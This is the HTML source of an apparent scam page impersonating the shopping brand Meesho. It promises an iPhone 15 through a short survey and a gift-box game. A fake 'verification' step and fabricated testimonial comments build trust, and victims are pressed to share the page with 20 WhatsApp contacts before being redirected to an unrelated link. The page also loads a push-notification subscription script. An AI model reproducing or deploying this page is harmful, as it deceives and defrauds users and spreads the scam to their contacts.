<!DOCTYPE html>
<html>
<head>
    <title>Meesho Anniversary Day Gifts</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Meesho - Anniversary Day Gifts">
    <meta property="og:image" content="https://offershore.top/uploads/ydxds-og.jpg">
    <meta property="og:description" content="The official brand has prepared many gifts for this holiday season!">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="robots" content="noindex, follow">
    <link rel="stylesheet" href="resources/bootstrap.min.css">
    <link rel="stylesheet" href="resources/select2.min.css">
    <link rel="stylesheet" href="resources/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="resources/style.css?v3">
    <script src="resources/jquery.min.js"></script>
    <script src="resources/bootstrap.min.js"></script>
    <script src="resources/sweetalert2.all.min.js"></script>
    <script src="resources/lazyload.min.js"></script>
    <script src="resources/popper.min.js"></script>
    <script src="domainz.js"></script>
    
    
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-926RQV9PKZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-926RQV9PKZ');
</script>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-KK5LHC6HNV"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-KK5LHC6HNV');
</script>

<script id="script">
	var s = document.createElement("script")
	s.src = "https://notix.io/ent/current/enot.min.js"
	s.onload = function (sdk) {
		sdk.startInstall(
			{
				"appId": "1006e468e65f53b746940cf21218eaf",
				"loadSettings": true
			}
		)
	}
	document.head.append(s)
</script>

</head>
<body>
    <div class="top-header">
    <div style="width: 100%;display: inline-flex;">
        <img height="40px" src="uploads/kongbai.png" onerror="this.classList.add('error');" style="position: absolute;">
        <img height="40px" src="uploads/ydxds-zhong.png" onerror="this.classList.add('error');" style="position: relative;margin: 0 auto;max-width: 200px;">
        <img height="40px" src="uploads/kongbai.png" onerror="this.classList.add('error');" style="position: absolute;right:14px;">
    </div>
</div>
<div id="p_body_content" style="position:relative;top:58px;">
    <div style="display: flex; padding: 10px; background: #570945;">
        <div class="header_flex_item" style="width:70%"><i class="fa fa-gift text-warning" aria-hidden="true"></i> Meesho -Anniversary Day Gifts</div>
        <div class="header_flex_item" style="text-align: right;"><span class="p_var-dia">14</span>&nbsp;<span class="p_var-mes_nombre">May</span>,
            <span class="p_var-anyo">2024</span></div>
    </div>
   
   
    <div class="contentdfgd" style="background-color:#fff;">
        
        
        <div class="main-content flag" id="content1" style="color:#232f3f;background-color:#fff ;">
            <h3 style="font-weight:700">Congratulations!</h3>
            <p>Meesho - Anniversary Day Gifts</p>
            <p>Through the questionnaire, you will have a chance to get iPhone 15 & more.</p>
            <img width="100%" src="uploads/ydxds-img.jpg">
            <div id="surveyBtn_pz">
                <div class="main-content flag" id="content1" style="background-color:#fff ;">
                    <div id="q1s"><p class="question"><strong>Question 1 of 4 :</strong> Do you know Meesho??</p><div class="survey_button bq1" data-bq="1">Yes</div><div class="survey_button bq1" data-bq="2">No</div></div><div id="q2s"><p class="question"><strong>Question 2 of 4 :</strong> How old are you?</p><div class="survey_button bq2" data-bq="1">18-29</div><div class="survey_button bq2" data-bq="2">30-39</div><div class="survey_button bq2" data-bq="3">40-49</div><div class="survey_button bq2" data-bq="4">50+</div></div><div id="q3s"><p class="question"><strong>Question 3 of 4 :</strong> What do you think of Meesho?</p><div class="survey_button bq3" data-bq="1">Very good</div><div class="survey_button bq3" data-bq="2">Excellent</div><div class="survey_button bq3" data-bq="3">Ok</div><div class="survey_button bq3" data-bq="4">Not too good</div></div><div id="q4s"><p class="question"><strong>Question 4 of 4 :</strong> Are you male or female?</p><div class="survey_button bq4" data-bq="1">Male</div><div class="survey_button bq4" data-bq="2">Female</div></div>
                </div>
            </div>
        </div>

        
        <div class="main-content" id="content2">
            <h2 style="text-align:center;margin:10px 0;">We are verifying your answers...</h2>
            <div class="d-flex justify-content-center">
                <div class="loader"></div>
            </div>
            <p></p>
            <p class="result" id="result1" style="color:#000">
                You have answered all 4 questions
            </p>
            <p class="result" id="result2" style="color:#000">
                Your IP address is valid for this promotion
            </p>
            <p class="result" id="result3" style="color:#000">
                Gifts are available and in stock!
            </p>
        </div>


        <div class="main-content" id="content3">
            <div id="boxes" class="boxes">
                <div class="div_img_gift">
                    <img class="img_gift" src="uploads/bxudhyfi.dda.png">
                </div>
                <div id="0" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="1" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="2" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="3" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="4" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="5" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="6" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="7" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="8" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="9" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="10" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
                <div id="11" class="try temblor">
                    <div class="caja_tapa">
                        <img src="uploads/ASKYAirlines.box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="uploads/ASKYAirlines.box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="uploads/bxudhyfi.xxi.png">
                    </div>
                    <div class="caja">
                        <img src="uploads/ASKYAirlines.box3.png">
                    </div>
                </div>
            </div>
        </div>


        <div class="main-content" id="content4" style="display: none">
            <div class="container share_page" style="padding: 0px">
                <div class="share_body share_page" style="width: 100%;">
                    <div class="share_hd_text">Congratulation!</div>
                    <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                        <img src="uploads/bxudhyfi.dda.png"
                             height="170px">
                    </div>
                    <div class="weui_dialog_text" style="color: #222222;">Your prize is: iPhone 15 (128gb), Follow the instructions on the next page to claim your prize !</div>
                    <div class="share_main">
                        <div class="share_ing" style="margin: 0 15px;">
                            <span style="color: #222222;">
                                <br>
                                1. Share with 5 groups/20 friends on the following apps (click on the corresponding icon below)
                                <br>
                                <br>
                                2. Click &quot;Continue&quot; and claim your prize.
                            </span>
                            <div id="shareBtn">
                                <div id="shareBtn_pz">
                                    <div style="color:#fff;display:block;width:80%;margin:10px auto;" class="btn btn-block btn-whatsapp" id="btn-whatsapp" onclick="shareBtn('whatsapp')"><i class="fa fa-whatsapp"></i> Whatsapp</div>
                                </div>
                            </div>
                            <div style="text-align: center;color: #999999; font-size: 14px">Share it until the blue bar is full!</div>
                            <div class="progress progress-striped active" style="margin: 10px 0; border-radius: 19px;">
                                <div class="progress-bar progress-bar-success" style="width:0;background-color:#0876b9;" id="progressbar"></div>
                            </div>
                            <div class="share_main_bt" onclick="continueBtn()" style="margin: 20px auto 0; background-color: #570945;">
                                Continue
                            </div>
                            <br>
                        </div>
                        <div class="share_success" style="margin: 15px;padding:15px;display: none">
                            <div style="text-align: center;font-size: 20px;font-weight: 500;line-height: 28px;margin: 5px;">
                                Congratulations! You have finished sharing, please wait patiently for our background review, the reward will be issued immediately after the review is completed.
                            </div>
                            <div style="text-align: center;font-size: 20px;font-weight: 500;line-height: 28px;margin: 5px;" id="tips_text">The review will be completed within <span class="badge badge-warning" style="font-size: large;background: #570945;color: #fff;" id="tips_number">12</span> Hours.</div><br>
                            <div style="color: #ff6f00;margin: 3px auto;">
Click on the "Track My Gift" button to track your gift
                            </div><br>
                            <a style="color:#fff;display:block;width:95%;margin:10px auto;" class="btn btn-block btn-whatsapp" id="btn2-whatsapp" href="https://greensbinbidding.com/st8xh7yt98?key=d594d090c13f6b0ab83c2b39b4ad1c13">Track My Gift</a>
                            
                        </div>
                    </div>
                    <div class="weui_dialog_text" style="margin-top:-5px;line-height: 36px;color: #666666">
                    </div>
                </div>
            </div>
        </div>
        <div class="main-content" style="margin-top: 10px">
            <div class="comments_face">
                <div class="comments">
                    <p style="margin:0;padding:0;float:left;display:block;width:50%">
                        <span style="color:#3b5998">Comment</span>
                    </p>
                    <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">
                        10 / 183
                    </p>
                    <div style="clear:both">
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/Anisha-Rahman.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Manjula Ekanayake</div>
                        </h3>
                        <p>It's true, I received the gift on the same day, thank you Meesho for the gift..</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>1 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/D-A-Taskin.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Sureshsuresh Suresh</div>
                        </h3>
                        <p>Indeed, I received a gift on the day I finished the task, a surprise, thank you Meesho for the gift!</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>3 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/Afifa-Marzuka.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Dilini Gunarathna</div>
                        </h3>
                        <p>I thought it was a joke, but it was delivered this morning! So surprised! @Meeshois the best company I've ever met!</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>13 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/Umme-Habiba-Bristy.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Madushani Gunarathne</div>
                        </h3>
                        <p>Thanks @Meesho! Really, I got a gift. I told my friends about it so they can get it too!</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>7 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/Arman-Hossain.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Arman Hossain</div>
                        </h3>
                        <p>I attended, thank you so much! I won and I received it today.</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>36 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/Angkita-Karmakar.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Angkita Karmakar</div>
                        </h3>
                        <p>I love these promotions! Are there any other promotions?@Meesho</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>14 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/Mariya-Afrin.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Arshi Samiha</div>
                        </h3>
                        <p>I thought it was a joke, but my family and I received gifts today, hope more people take the survey@Meesho</p>
                        <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>58 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/Md-Faysal-Ahmad-Akash.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>D A Taskin</div>
                        </h3>
                        <p>Are there any other surveys to take?</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>11 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/Farhana-Bristy.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Farhana Bristy</div>
                        </h3>
                        <p>really? When can I receive it@Meesho</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>20 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='uploads/Arshi-Samiha.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Md Faysal Ahmad Akash</div>
                        </h3>
                        <p>It's true, I got a gift, did you get it?</p>
                        <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
